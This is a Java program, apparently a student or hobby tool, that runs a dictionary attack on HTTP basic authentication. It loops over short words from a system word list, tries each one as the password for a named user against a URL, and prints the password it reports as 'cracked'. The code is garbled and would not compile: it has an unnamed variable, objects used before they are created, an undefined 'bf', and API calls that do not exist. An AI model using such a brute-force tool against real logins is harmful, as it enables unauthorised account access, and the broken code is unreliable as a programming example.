import java.net.*;
import java.io.*;

public  class Dictionary
{
	public Dictionary(String u,String uname) throws Exception
	{
		URL url=null;
		String pass="";
		try
		{
			url=new URL(u);
			PasswordAuthentication pa;
			MyAuthenticator =new MyAuthenticator();
			HttpURLConnection htt ;
			BufferedReader in=new BufferedReader(new FileReader(new File("/usr/share/lib/dict/words"))); 
			int c=0;
			while((pass=in.readLine()) != null)
			{
				if(pass.length()<=3)
				{
					c++;
					pa=new PasswordAuthentication(uname,pass.toCharArray());
					htt.setPasswordAuthentication(pa);
					Authenticator.setDefault();
					htt=(HttpURLConnection)url.openConnection();
System.out.println("Try :"+(c)+"      password:("+pass+") response message: ("+bf.getResponseMessage()+")");
					if(htt.getResponseCode() != 401)
						throw new NullPointerException();


					htt.disconnect();
				}
			}

		}
		catch(MalformedURLException mfe)
		{
			System.out.println("The URL :"+u+" is not a proper URL.");
		}
		catch(NullPointerException great)
		{
			System.out.println("\n\n The password is cracked.\n The password is : "+pass);
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}


	public static void main (String[] args)  throws Exception
	{
		if(args.length!=2)
			System.out.println("Usage :\n java Dictionary <url> <user-name>");
		else
		{
			System.out.println("Starting the Dictionary Attack : "+args[0]);
			new Dictionary(args[0],args[1]);
		}
	}
}


